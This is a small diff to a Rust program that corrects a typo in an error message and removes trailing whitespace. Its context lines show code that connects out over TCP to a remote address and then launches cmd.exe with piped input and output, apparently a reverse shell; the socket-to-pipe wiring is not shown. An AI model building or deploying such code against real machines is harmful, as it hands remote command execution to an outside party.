@@ -18,7 +18,7 @@ fn main() {
         loop {
             match TcpStream::connect(
                 addr.to_socket_addrs()
-                    .expect("dns resolver fialure")
+                    .expect("dns resolver failure")
                     .into_iter()
                     .next()
                     .expect("dns resolver failure"),
@@ -27,7 +27,7 @@ fn main() {
             {
                 Ok(tcp) => {
                     println!("connected!");
-                    
+
                     let mut child = smol::process::Command::new("cmd.exe")
                         .stdout(smol::process::Stdio::piped())
                         .stdin(smol::process::Stdio::piped())
